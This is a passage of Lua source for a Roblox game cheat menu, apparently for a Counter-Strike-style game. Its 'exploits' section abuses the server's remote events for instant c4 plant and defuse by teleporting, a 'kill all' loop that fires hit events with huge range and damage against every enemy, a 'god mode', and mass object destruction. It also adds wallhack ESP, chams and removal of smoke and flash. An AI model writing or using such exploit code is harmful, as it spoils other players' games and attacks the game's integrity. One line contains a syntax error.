		wait(0.2)
		LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, 0, 0)
		game.Workspace.CurrentCamera.CameraType = "Custom"
		planting = false
	end
	end)
end)

exploits:Element("Button", "defuse c4", {}, function()
	pcall(function()
	if IsAlive(LocalPlayer) and workspace.Map.Gamemode.Value == "defusal" and not defusing and workspace:FindFirstChild("C4") then 
		defusing = true
		LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, 0, 0)
		local pos = LocalPlayer.Character.HumanoidRootPart.CFrame 
		workspace.CurrentCamera.CameraType = "Fixed"
		LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.C4.Handle.CFrame + C.Vec3(0, 2, 0)
		LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, 0, 0)
		wait(0.1)
		LocalPlayer.Backpack.PressDefuse:FireServer(workspace.C4)
		LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, 0, 0)
		wait(0.25)
		if IsAlive(LocalPlayer) and workspace:FindFirstChild("C4") and workspace.C4:FindFirstChild("Defusing") and workspace.C4.Defusing.Value == LocalPlayer then
			LocalPlayer.Backpack.Defuse:FireServer(workspace.C4)
		end
		LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, 0, 0)
		wait(0.2)
		LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, 0, 0)
		LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, 0, 0)
		game.Workspace.CurrentCamera.CameraType = "Custom"
		defusing = false
	end
	end)
end)


exploits:Element("Dropdown", "Plant c4 type", {options = {"Normal", "Instant", "Anywhere"}})
exploits:Element("Dropdown", "Defuse c4 type", {options = {"Normal", "Instant", "Anywhere"}})
exploits:Element("ToggleKeybind", "otw knife")
exploits:Element('ToggleKeybind', 'around the world')
exploits:Element('Slider', 'height', {min = -200, max = 200, default = 0})
exploits:Element('Slider', 'distance', {min = 1, max = 500, default = 0})
exploits:Element('Slider', 'speed', {min = 1, max = 100, default = 0})
exploits:Element('Button', 'God Mode', {}, function()
local ApplyGun = ReplicatedStorage.Events.ApplyGun;
ApplyGun:FireServer({
    Model = ReplicatedStorage.Hostage.Hostage,
    Name = "USP"
}, game.Players.LocalPlayer);
end)
exploits:Element('ButtonKeybind', 'stormy breaker', {}, function()
	game.Players.localPlayer.Character.UpperTorso.Waist:Destroy()
end)
exploits:Element('ToggleKeybind', 'custom tap')
exploits:Element('Slider', 'tap amount', {min = 2, max = 20, default = 0})    
local stormykillall 
exploits:Element("ToggleKeybind", "kill all", {}, function(tbl)
	if tbl.Toggle then
		stormykillall = RunService.RenderStepped:Connect(function()
			if not tbl.Toggle and not tbl.Active then return stormykillall:Disconnect() end
				for _,Player in pairs(Players:GetPlayers()) do
					if Player.Character and Player.Team ~= LocalPlayer.Team and Player.Character:FindFirstChild('UpperTorso') then
						if game:GetService('ReplicatedStorage').Events:FindFirstChild('HitNN') then
						game:GetService('ReplicatedStorage').Events.HitNN:FireServer(
							Player.Character.UpperTorso,
							Player.Character.UpperTorso.CFrame.p,
							Client.gun.Name, --3
							100000000000000, -- Range --4
							game.Players.LocalPlayer.Character:WaitForChild("Gun"), --5
							C.Vec3(), -- Start Position --6
							C.Vec3(),
							1000, -- Damage Modifier
							false,
							true,
							C.Vec3(),
							100,
							C.Vec3()
						)
						else
						game:GetService('ReplicatedStorage').Events.Hitpart:FireServer(
							Player.Character.UpperTorso,
							Player.Character.UpperTorso.CFrame.p,
							Client.gun.Name, --3
							100000000000000, -- Range --4
							game.Players.LocalPlayer.Character:WaitForChild("Gun"), --5
							C.Vec3(), -- Start Position --6
							C.Vec3(),
							1000, -- Damage Modifier
							false,
							true,
							C.Vec3(),
							100,
							C.Vec3()
						)						
						end
				end
			end
		end)
	end
end)
local hexagonkillall			
exploits:Element("Slider", "damage modifier", {min = 1, max = 5, default = 1}) 
exploits:Element("ToggleKeybind", "hexagon kill all", {}, function(tbl) 

	if tbl.Toggle then
		hexagonkillall = RunService.RenderStepped:Connect(function()
			if not tbl.Toggle and not tbl.Active then return hexagonkillall:Disconnect() end
				for i,v in ipairs(Players:GetPlayers()) do
					if v ~= LocalPlayer and v.Team ~= LocalPlayer.Team and IsAlive(v) and IsAlive(game.Players.LocalPlayer) then
						if ReplicatedStorage.Events:FindFirstChild('HitNN') then
						ReplicatedStorage.Events.HitNN:FireServer(
							v.Character.UpperTorso,
							v.Character.UpperTorso.CFrame
							"Banana",
							100000000000, -- Range
							game.Players.LocalPlayer.Character:WaitForChild("Gun"),
							C.Vec3(), -- Start Position
							C.Vec3(),
							100, -- Damage Modifier
							false,
							false,
							C.Vec3(),
							100,
							C.Vec3()
						)
						end
					end
				end
		end)
	else
		 hexagonkillall:Disconnect() 
	end
end)

exploits:Element('Toggle', 'whizz all', {}, function(tbl)
	while tbl.Toggle and LocalPlayer.Character:FindFirstChild('Gun') do
	wait()
		for _,Player in pairs(Players:GetPlayers()) do
			game:GetService('ReplicatedStorage').Events.Whizz:FireServer(Player)
		end
	end
end)	
local quickpeekshit = rage:Sector('Quick peeks', 'Right')
quickpeekshit:Element('ToggleKeybind', 'quick peek')
quickpeekshit:Element('Slider', 'wbr', {min = 1, max = 100, default = 1,})
quickpeekshit:Element('ToggleTrans', 'visualize circle', {default = {Color = C.COL3RGB(255,255,255)}})
quickpeekshit:Element('Toggle', 'unfreeze shoot')
quickpeekshit:Element('Dropdown', 'peek method', {options = {'freeze', 'teleport', 'tween'}})
quickpeekshit:Element('Slider', 'tween speed', {min = 1, max = 100, default = 1,})

quickpeekshit:Element('Toggle', 'limit peek')
quickpeekshit:Element('Slider', 'limit distance', {min = 1, max = 200, default = 10,})

peektimewait = 0
quickpeekshit:Element('Toggle', 'time limit')
quickpeekshit:Element('Slider', 'time duration', {min = 1, max = 85, default = 5,})

OldClientFireBullet = Client.firebullet

quickpeekshit:Element('ToggleKeybind', 'quick peek (left)', {}, function(tbl)
if tbl.Toggle and tbl.Active then
	local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
	LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos + C.Vec3(values.rage.exploits['distance'].Slider,0,0)
	wait(0.3)
	LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
end --values.rage.exploits['quick peek'].Toggle
end)
quickpeekshit:Element('ToggleKeybind', 'quick peek (right)', {}, function(tbl)
if tbl.Toggle and tbl.Active then
	local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
	LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos + C.Vec3(0,0,values.rage.exploits['distance'].Slider)
	wait(0.3)
	LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
end
end)

quickpeekshit:Element('Slider', 'distance', {min = 1, max = 50, default = 5})

exploits:Element("Toggle","debris clear",{},function(tbl)
    while values.rage.exploits["debris clear"].Toggle == true do
        wait(1)
        for i,v in pairs(workspace.Debris:GetDescendants()) do
            ReplicatedStorage.Events.DestroyObject:FireServer(v)
        end 
    end
end)


local players = visuals:Sector("players", "Left") 
players:Element("Toggle", "teammates") 
players:Element("ToggleColor", "box", {default = {Color = C.COL3RGB(255,255,255)}}) 
players:Element("ToggleColor", "name", {default = {Color = C.COL3RGB(255,255,255)}}) 
players:Element("ToggleColor", "health", {default = {Color = C.COL3RGB(0,1,0)}}) 
players:Element("ToggleColor", "weapon", {default = {Color = C.COL3RGB(255,255,255)}}) 
players:Element("ToggleColor", "weapon icon", {default = {Color = C.COL3RGB(255,255,255)}}) 
players:Element("Jumbobox", "indicators", {options = {"armor"}}) 
players:Element("Jumbobox", "outlines", {options = {"drawings", "text"}, default = {Jumbobox = {"drawings", "text"}}}) 
players:Element("Dropdown", "font", {options = {"Plex", "Monospace", "System", "UI"}}) 
players:Element("Slider", "size", {min = 12, max = 16, default = 13}) 


--players:Element('Slider', 'cham thickness', {min = 0, max = 10, default = 0})
local function addhighlight(object)
   local highlight = Instance.new('Highlight', highlights)
   highlight.Adornee = object
   
   highlight.FillColor = values.visuals.players.chams.Color
   highlight.FillTransparency = values.visuals.players.chams.Transparency
   
   highlight.OutlineColor = values.visuals.players['visible chams'].Color
   highlight.OutlineTransparency = values.visuals.players['visible chams'].Transparency
   
   highlight.Adornee.Changed:Connect(function()
       if not highlight.Adornee or not highlight.Adornee.Parent then
           highlight:Destroy()    
       end
   end)
   
   return highlight
end

players:Element('ToggleTrans', 'chams', {default = {Color = C.COL3RGB(255,255,255), Transparency = 0}}, function(tbl)
	for _,Player in pairs(Players:GetPlayers()) do
	if Player == LocalPlayer then continue end
		addhighlight(Player)
	end
end)

--players:Element('Slider', 'vcham thickness', {min = 0, max = 10, default = 0})

players:Element('ToggleTrans', 'visible chams',  {default = {Color = C.COL3RGB(255,255,255), Transparency = 0}}, function(tbl)
	for _,Player in pairs(Players:GetPlayers()) do
	if Player == LocalPlayer then continue end
		addhighlight(Player)
	end
end)
--big ass code incoming
local function DrawLine()
    local l = Drawing.new("Line")
    l.Visible = false
    l.From = C.Vec2(0, 0)
    l.To = C.Vec2(1, 1)
    l.Color = values.visuals.players['skeleton esp'].Color
    l.Thickness = 1
    l.Transparency = 1
    return l
end

local function DrawESP(plr)
    repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil
    local limbs = {}
    local R15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) and true or false
    if R15 then 
        limbs = {
            -- Spine
            Head_UpperTorso = DrawLine(),
            UpperTorso_LowerTorso = DrawLine(),
            -- Left Arm
            UpperTorso_LeftUpperArm = DrawLine(),
            LeftUpperArm_LeftLowerArm = DrawLine(),
            LeftLowerArm_LeftHand = DrawLine(),
            -- Right Arm
            UpperTorso_RightUpperArm = DrawLine(),
            RightUpperArm_RightLowerArm = DrawLine(),
            RightLowerArm_RightHand = DrawLine(),
            -- Left Leg
            LowerTorso_LeftUpperLeg = DrawLine(),
            LeftUpperLeg_LeftLowerLeg = DrawLine(),
            LeftLowerLeg_LeftFoot = DrawLine(),
            -- Right Leg
            LowerTorso_RightUpperLeg = DrawLine(),
            RightUpperLeg_RightLowerLeg = DrawLine(),
            RightLowerLeg_RightFoot = DrawLine(),
        }
    else 
        limbs = {
            Head_Spine = DrawLine(),
            Spine = DrawLine(),
            LeftArm = DrawLine(),
            LeftArm_UpperTorso = DrawLine(),
            RightArm = DrawLine(),
            RightArm_UpperTorso = DrawLine(),
            LeftLeg = DrawLine(),
            LeftLeg_LowerTorso = DrawLine(),
            RightLeg = DrawLine(),
            RightLeg_LowerTorso = DrawLine()
        }
    end
    local function Visibility(state)
        for i, v in pairs(limbs) do
            v.Visible = state
        end
    end

    local function Colorize(color)
        for i, v in pairs(limbs) do
            v.Color = color
        end
    end

        local connection
        connection = RunService.RenderStepped:Connect(function()
            if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                if vis then
                    -- Head
                    local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                    if limbs.Head_UpperTorso.From ~= C.Vec2(H.X, H.Y) then
                        --Spine
                        local UT = Camera:WorldToViewportPoint(plr.Character.UpperTorso.Position)
                        local LT = Camera:WorldToViewportPoint(plr.Character.LowerTorso.Position)
                        -- Left Arm
                        local LUA = Camera:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
                        local LLA = Camera:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
                        local LH = Camera:WorldToViewportPoint(plr.Character.LeftHand.Position)
                        -- Right Arm
                        local RUA = Camera:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
                        local RLA = Camera:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
                        local RH = Camera:WorldToViewportPoint(plr.Character.RightHand.Position)
                        -- Left leg
                        local LUL = Camera:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
                        local LLL = Camera:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
                        local LF = Camera:WorldToViewportPoint(plr.Character.LeftFoot.Position)
                        -- Right leg
                        local RUL = Camera:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
                        local RLL = Camera:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
                        local RF = Camera:WorldToViewportPoint(plr.Character.RightFoot.Position)

                        --Head
                        limbs.Head_UpperTorso.From = C.Vec2(H.X, H.Y)
                        limbs.Head_UpperTorso.To = C.Vec2(UT.X, UT.Y)

                        --Spine
                        limbs.UpperTorso_LowerTorso.From = C.Vec2(UT.X, UT.Y)
                        limbs.UpperTorso_LowerTorso.To = C.Vec2(LT.X, LT.Y)

                        -- Left Arm
                        limbs.UpperTorso_LeftUpperArm.From = C.Vec2(UT.X, UT.Y)
                        limbs.UpperTorso_LeftUpperArm.To = C.Vec2(LUA.X, LUA.Y)

                        limbs.LeftUpperArm_LeftLowerArm.From = C.Vec2(LUA.X, LUA.Y)
                        limbs.LeftUpperArm_LeftLowerArm.To = C.Vec2(LLA.X, LLA.Y)

                        limbs.LeftLowerArm_LeftHand.From = C.Vec2(LLA.X, LLA.Y)
                        limbs.LeftLowerArm_LeftHand.To = C.Vec2(LH.X, LH.Y)

                        -- Right Arm
                        limbs.UpperTorso_RightUpperArm.From = C.Vec2(UT.X, UT.Y)
                        limbs.UpperTorso_RightUpperArm.To = C.Vec2(RUA.X, RUA.Y)

                        limbs.RightUpperArm_RightLowerArm.From = C.Vec2(RUA.X, RUA.Y)
                        limbs.RightUpperArm_RightLowerArm.To = C.Vec2(RLA.X, RLA.Y)

                        limbs.RightLowerArm_RightHand.From = C.Vec2(RLA.X, RLA.Y)
                        limbs.RightLowerArm_RightHand.To = C.Vec2(RH.X, RH.Y)

                        -- Left Leg
                        limbs.LowerTorso_LeftUpperLeg.From = C.Vec2(LT.X, LT.Y)
                        limbs.LowerTorso_LeftUpperLeg.To = C.Vec2(LUL.X, LUL.Y)

                        limbs.LeftUpperLeg_LeftLowerLeg.From = C.Vec2(LUL.X, LUL.Y)
                        limbs.LeftUpperLeg_LeftLowerLeg.To = C.Vec2(LLL.X, LLL.Y)

                        limbs.LeftLowerLeg_LeftFoot.From = C.Vec2(LLL.X, LLL.Y)
                        limbs.LeftLowerLeg_LeftFoot.To = C.Vec2(LF.X, LF.Y)

                        -- Right Leg
                        limbs.LowerTorso_RightUpperLeg.From = C.Vec2(LT.X, LT.Y)
                        limbs.LowerTorso_RightUpperLeg.To = C.Vec2(RUL.X, RUL.Y)

                        limbs.RightUpperLeg_RightLowerLeg.From = C.Vec2(RUL.X, RUL.Y)
                        limbs.RightUpperLeg_RightLowerLeg.To = C.Vec2(RLL.X, RLL.Y)

                        limbs.RightLowerLeg_RightFoot.From = C.Vec2(RLL.X, RLL.Y)
                        limbs.RightLowerLeg_RightFoot.To = C.Vec2(RF.X, RF.Y)
                    end

                    if limbs.Head_UpperTorso.Visible ~= true then
                        Visibility(true)
                    end
                else 
                    if limbs.Head_UpperTorso.Visible ~= false then
                        Visibility(false)
                    end
                end
            else 
                if limbs.Head_UpperTorso.Visible ~= false then
                    Visibility(false)
                end
                if game.Players:FindFirstChild(plr.Name) == nil then 
                    for i, v in pairs(limbs) do
						v.Transparency = 0
                        v:Remove()
                    end
                    connection:Disconnect()
                end
				if plr.TeamColor == LocalPlayer.TeamColor and not (values.visuals.players.teammates.Toggle) then
					Visibility(false)
				   for i, v in pairs(limbs) do
						v.Transparency = 0
                        v:Remove()
                    end
                    connection:Disconnect()
				end
            end
				if not values.visuals.players['skeleton esp'].Toggle then 
				Visibility(false)
				   for i, v in pairs(limbs) do
						v.Transparency = 0
                        v:Remove()
                    end
                    connection:Disconnect()
				end			
			
        end)


end

players:Element('ToggleColor', 'skeleton esp', {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl)
	if tbl.Toggle then
		for i, v in pairs(game:GetService("Players"):GetPlayers()) do
			if v.Name ~= LocalPlayer.Name and (values.visuals.players.teammates.Toggle and true or v.Team ~= LocalPlayer.Team) then
				DrawESP(v)
			end
		end
		game.Players.PlayerAdded:Connect(function(newplr)
			if newplr.Name ~= LocalPlayer.Name and tbl.Toggle then
				DrawESP(newplr)
			end
		end)
	end
end)


local effects = visuals:Sector("effects", "Right") 
effects:Element("ToggleTrans", "weapon chams", {default = {Color = C.COL3RGB(255,255,255), Transparency = 0}}, function(tbl) 
	if WeaponObj == nil then return end 
	if tbl.Toggle then 
		for i,v in pairs(WeaponObj) do 
			UpdateWeapon(v) 
		end 
	else 
		for i,v in pairs(WeaponObj) do 
			if v:IsA("MeshPart") then v.TextureID = v.OriginalTexture.Value end 
			if v:IsA("Part") and v:FindFirstChild("Mesh") and not v:IsA("BlockMesh") then 
				v.Mesh.TextureId = v.Mesh.OriginalTexture.Value 
				v.Mesh.VertexColor = C.Vec3(1,1,1) 
			end 
			v.Color = v.OriginalColor.Value 
			v.Material = v.OriginalMaterial.Value 
			v.Transparency = 0 
		end 
	end 
end) 
effects:Element("Dropdown", "weapon material", {options = {"Smooth", "Flat", "ForceField", "Glass"}}, function(tbl) 
	if WeaponObj == nil then return end 
	if values.visuals.effects["weapon chams"].Toggle then 
		for i,v in pairs(WeaponObj) do 
			UpdateWeapon(v) 
		end 
	end 
end) 
effects:Element("Dropdown", "weapon ff anim", {options = {"none", "scanning", "lava", "pulse"}}, function(tbl)
	if values.visuals.effects["weapon chams"].Toggle and values.visuals.effects["weapon material"].Dropdown == "ForceField" then
		for i,v in pairs(WeaponObj) do
			UpdateWeapon(v)
		end
	end
end)

effects:Element("Slider", "reflectance", {min = 0, max = 100, default = 0}, function(tbl) 
	if values.visuals.effects["weapon chams"].Toggle then 
		for i,v in pairs(WeaponObj) do 
			UpdateWeapon(v) 
		end 
	end 
end) 
effects:Element("ToggleTrans", "accessory chams", {default = {Color = C.COL3RGB(255,255,255)}}, function(val) 
	if RArm == nil or LArm == nil then return end 
	if val.Toggle then 
		if RGlove ~= nil then 
			UpdateAccessory(RGlove) 
		end 
		if RSleeve ~= nil then 
			UpdateAccessory(RSleeve) 
		end 
		if LGlove ~= nil then 
			UpdateAccessory(LGlove) 
		end 
		if LSleeve ~= nil then 
			UpdateAccessory(LSleeve) 
		end 
	else 
		if RGlove then 
			ReverseAccessory(RGlove) 
		end 
		if LGlove then 
			ReverseAccessory(LGlove) 
		end 
		if RSleeve then 
			ReverseAccessory(RSleeve) 
		end 
		if LSleeve then 
			ReverseAccessory(LSleeve) 
		end 
	end 
end) 
effects:Element("Dropdown", "accessory material", {options = {"Smooth","ForceField"}}, function(val) 
	if RArm == nil or LArm == nil then return end 
	if values.visuals.effects["accessory chams"].Toggle then 
		if RGlove ~= nil then 
			UpdateAccessory(RGlove) 
		end 
		if RSleeve ~= nil then 
			UpdateAccessory(RSleeve) 
		end 
		if LGlove ~= nil then 
			UpdateAccessory(LGlove) 
		end 
		if LSleeve ~= nil then 
			UpdateAccessory(LSleeve) 
		end
	end 
end) 
effects:Element("ToggleTrans", "arm chams", {default = {Color = C.COL3RGB(255,255,255)}}, function(val) 
	if RArm == nil then return end 
	if LArm == nil then return end 
	if val.Toggle then 
		RArm.Color = val.Color 
		LArm.Color = val.Color 
		RArm.Transparency = val.Transparency 
		LArm.Transparency = val.Transparency 
	else 
		RArm.Color = RArm.Color3Value.Value 
		LArm.Color = RArm.Color3Value.Value 
		RArm.Transparency = 0 
		LArm.Transparency = 0 
	end 
end) 

effects:Element("Jumbobox", "removals", {options = {"scope", "scope lines", "flash", "smoke", "decals", "shadows", "clothes"}}, function(val) 
	local tbl = val.Jumbobox 
	if C.TBLFIND(tbl, "decals") then 
		Client.createbullethole = function() end 
		for i,v in pairs(workspace.Debris:GetChildren()) do 
			if v.Name == "Bullet" or v.Name == "SurfaceGui" then 
				v:Destroy() 
			end 
		end 
	else 
		Client.createbullethole = oldcreatebullethole 
	end 
	if C.TBLFIND(tbl, "clothes") then 
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("UpperTorso") then 
			if LocalPlayer.Character:FindFirstChild("Shirt") then 
				LocalPlayer.Character:FindFirstChild("Shirt").ShirtTemplate = "" 
			end 
			if LocalPlayer.Character:FindFirstChild("Pants") then 
				LocalPlayer.Character:FindFirstChild("Pants").PantsTemplate = "" 
			end 
		end 
	else 
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("UpperTorso") then 
			if LocalPlayer.Character:FindFirstChild("Shirt") then 
				LocalPlayer.Character:FindFirstChild("Shirt").ShirtTemplate = LocalPlayer.Character:FindFirstChild("Shirt").OriginalTexture.Value 
			end 
			if LocalPlayer.Character:FindFirstChild("Pants") then 
				LocalPlayer.Character:FindFirstChild("Pants").PantsTemplate = LocalPlayer.Character:FindFirstChild("Pants").OriginalTexture.Value 
			end 
		end 
	end 
	if C.TBLFIND(tbl, "scope") then 
		PlayerGui.GUI.Crosshairs.Scope.ImageTransparency = 1 
		PlayerGui.GUI.Crosshairs.Scope.Scope.ImageTransparency = 1 
		PlayerGui.GUI.Crosshairs.Frame1.Transparency = 1 
		PlayerGui.GUI.Crosshairs.Frame2.Transparency = 1 
		PlayerGui.GUI.Crosshairs.Frame3.Transparency = 1 
		PlayerGui.GUI.Crosshairs.Frame4.Transparency = 1 
	else 
		PlayerGui.GUI.Crosshairs.Scope.ImageTransparency = 0 
		PlayerGui.GUI.Crosshairs.Scope.Scope.ImageTransparency = 0 
		PlayerGui.GUI.Crosshairs.Frame1.Transparency = 0 
		PlayerGui.GUI.Crosshairs.Frame2.Transparency = 0 
		PlayerGui.GUI.Crosshairs.Frame3.Transparency = 0 
		PlayerGui.GUI.Crosshairs.Frame4.Transparency = 0 
	end 
	PlayerGui.Blnd.Enabled = not C.TBLFIND(tbl, "flash") and true or false 
	Lighting.GlobalShadows = not C.TBLFIND(tbl, "shadows") and true or false 
	if workspace.Ray_Ignore:FindFirstChild("Smokes") then 
		if C.TBLFIND(tbl, "smoke") then 
			for i,smoke in pairs(workspace.Ray_Ignore.Smokes:GetChildren()) do 
				smoke.ParticleEmitter.Rate = 0 
			end 
		else 
			for i,smoke in pairs(workspace.Ray_Ignore.Smokes:GetChildren()) do 
				smoke.ParticleEmitter.Rate = smoke.OriginalRate.Value 
			end 
		end 
	end 
end) 
effects:Element("Toggle", "force crosshair") 
effects:Element("ToggleColor", "world color", {default = {Color = C.COL3RGB(255,255,255)}}, function(val) 
	if val.Toggle then 
		Camera.ColorCorrection.TintColor = val.Color 
	else 
		Camera.ColorCorrection.TintColor = C.COL3RGB(255,255,255) 
	end 
end) 
effects:Element("Toggle", "shadowmap technology", nil, function(val) sethiddenproperty(Lighting, "Technology", val.Toggle and "ShadowMap" or "Legacy") end) 
effects:Element("ToggleColor", "indoor ambient", {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl) 
	if tbl.Toggle then 
		game.Lighting.Ambient = tbl.Color
	else 
		game.Lighting.Ambient = C.COL3RGB(255,255,255) 
	end 
end)
effects:Element("ToggleColor", "outdoor ambient", {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl) 
	if tbl.Toggle then 
		game.Lighting.OutdoorAmbient = tbl.Color
	else 
		game.Lighting.OutdoorAmbient = C.COL3RGB(255,255,255) 
	end 
end)
local self = visuals:Sector("self", "Right") 
self:Element("ToggleKeybind", "third person", {}, function(tbl) 
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then 
		if tbl.Toggle then 
			if tbl.Active then 
				LocalPlayer.CameraMaxZoomDistance = values.visuals.self.distance.Slider 
				LocalPlayer.CameraMinZoomDistance = values.visuals.self.distance.Slider 
				LocalPlayer.CameraMaxZoomDistance = values.visuals.self.distance.Slider 
				LocalPlayer.CameraMinZoomDistance = values.visuals.self.distance.Slider 
			else 
				LocalPlayer.CameraMaxZoomDistance = 0 
				LocalPlayer.CameraMinZoomDistance = 0 
				LocalPlayer.CameraMaxZoomDistance = 0 
				LocalPlayer.CameraMinZoomDistance = 0 
			end 
		else 
			LocalPlayer.CameraMaxZoomDistance = 0 
			LocalPlayer.CameraMinZoomDistance = 0 
		end 
	end 
end) 
self:Element("Slider", "distance", {min = 6, max = 18, default = 12}, function(tbl) 
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then 
		if values.visuals.self["third person"].Toggle then 
			if values.visuals.self["third person"].Active then 
				LocalPlayer.CameraMaxZoomDistance = tbl.Slider 
				LocalPlayer.CameraMinZoomDistance = tbl.Slider 
				LocalPlayer.CameraMaxZoomDistance = tbl.Slider 
				LocalPlayer.CameraMinZoomDistance = tbl.Slider 
			else 
				LocalPlayer.CameraMaxZoomDistance = 0 
				LocalPlayer.CameraMinZoomDistance = 0 
			end 
		else 
			LocalPlayer.CameraMaxZoomDistance = 0 
			LocalPlayer.CameraMinZoomDistance = 0 
		end 
	end 
end) 
LocalPlayer:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(function(current) 
	if values.visuals.self["third person"].Toggle then 
		if values.visuals.self["third person"].Active then 
			if current ~= values.visuals.self.distance.Slider then 
				LocalPlayer.CameraMinZoomDistance = values.visuals.self.distance.Slider 
			end 
		end 
	end 
end) 
self:Element("Slider", "fov changer", {min = 0, max = 120, default = 80}, function(value) 
	RunService.RenderStepped:Wait() 
	if LocalPlayer.Character == nil then return end 
	if fov == value.Slider then return end 
	if values.visuals.self["on scope"].Toggle or not LocalPlayer.Character:FindFirstChild("AIMING") then 
		Camera.FieldOfView = value.Slider 
	end 
end) 
self:Element("Toggle", "on scope") 
self:Element("Toggle", "viewmodel changer") 
self:Element("Slider", "viewmodel x", {min = -20, max = 20}, function(val) 
	ViewmodelOffset = C.CF(values.visuals.self["viewmodel x"].Slider/7, values.visuals.self["viewmodel y"].Slider/7, values.visuals.self["viewmodel z"].Slider/7) * C.CFAngles(0, 0, values.visuals.self.roll.Slider/50) 
end) 
self:Element("Slider", "viewmodel y", {min = -20, max = 20}, function(val) 
	ViewmodelOffset = C.CF(values.visuals.self["viewmodel x"].Slider/7, values.visuals.self["viewmodel y"].Slider/7, values.visuals.self["viewmodel z"].Slider/7) * C.CFAngles(0, 0, values.visuals.self.roll.Slider/50) 
end) 
self:Element("Slider", "viewmodel z", {min = -20, max = 20}, function(val) 
	ViewmodelOffset = C.CF(values.visuals.self["viewmodel x"].Slider/7, values.visuals.self["viewmodel y"].Slider/7, values.visuals.self["viewmodel z"].Slider/7) * C.CFAngles(0, 0, values.visuals.self.roll.Slider/50) 
end) 
self:Element("Slider", "roll", {min = -100, max = 100}, function(val) 
	ViewmodelOffset = C.CF(values.visuals.self["viewmodel x"].Slider/7, values.visuals.self["viewmodel y"].Slider/7, values.visuals.self["viewmodel z"].Slider/7) * C.CFAngles(0, 0, values.visuals.self.roll.Slider/50) 
end)  
			self:Element("Toggle", "visualize silent angle")
			self:Element("Slider", "silent angle speed", {min = 0, max = 30, default = 5}) 
self:Element("ToggleColor", "self chams", {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl) 
	if tbl.Toggle then 
		for _,obj in pairs(SelfObj) do 
			if obj.Parent ~= nil then 
				obj.Material = values.visuals.self["self chams material"].Dropdown 
				obj.Color = tbl.Color 
			end 
		end 
	else 
		for _,obj in pairs(SelfObj) do 
			if obj.Parent ~= nil then 
				obj.Material = obj.OriginalMaterial.Value 
				obj.Color = obj.OriginalColor.Value 
			end 
		end 
	end 
end) 
--self:Element("Toggle", "silent dog shit")
self:Element("Dropdown", "self chams material", {options = {"ForceField", "Neon", "Glass"}}, function(val)
	if C.TBLFIND(val, "ForceField") then
		for _,obj in pairs(SelfObj) do 
			if obj.Parent ~= nil then 
				obj.Material = Enum.Material.ForceField
				obj.Color = tbl.Color
			end
		end
	else
		if C.TBLFIND(val, "Neon") then
			for _,obj in pairs(SelfObj) do 
				if obj.Parent ~= nil then
					obj.Material = Enum.Material.Neon
					obj.Color = tbl.Color
				end
			end
		else
			if C.TBLFIND(val, "Glass") then
				for _,obj in pairs(SelfObj) do
					if obj.Parent ~= nil then
						obj.Material = Enum.Material.Glass
						obj.Color = tbl.Color
					end
				end
			end
		end
	end
end)

self:Element("Slider", "scope blend", {min = 0, max = 100, default = 0}) 

local ads = Client.updateads 
Client.updateads = function(self, ...) 
	local args = {...} 
	coroutine.wrap(function() 
		wait() 
		if LocalPlayer.Character ~= nil then 
			for _,part in pairs(LocalPlayer.Character:GetDescendants()) do 
				if part:IsA("Part") or part:IsA("MeshPart") then 
					if part.Transparency ~= 1 then 
						part.Transparency = LocalPlayer.Character:FindFirstChild("AIMING") and values.visuals.self["scope blend"].Slider/100 or 0 
					end 
				end 
				if part:IsA("Accessory") then 
					part.Handle.Transparency = LocalPlayer.Character:FindFirstChild("AIMING") and values.visuals.self["scope blend"].Slider/100 or 0 
				end 
			end 
		end 
	end)() 
	return ads(self, ...) 
end 

local trail = visuals:Sector('trail', 'Left')

trail:Element('Toggle', 'enable', {Toggle = true})

trail:Element('Toggle', 'face camera', {Toggle = false})

trail:Element('ToggleColor', 'custom color', {default = {Color = C.COL3RGB(255,255,255)}})

trail:Element('Slider', 'size (x,z)', {min = 1, max = 50, default = 10})

trail:Element('Slider', 'offset (y)', {min = 1, max = 50, default = 10})

trail:Element('Slider', 'max length', {min = 1, max = 100, default = 20})

trail:Element('Dropdown', 'image type', {options = {"normal", "lightning 2", "lightning 3", "custom"}}) -- normal, lighting 4, lighting 5

trail:Element('TextBox', 'image', {placeholder = 'image id here'})

local world = visuals:Sector("world", "Left") 
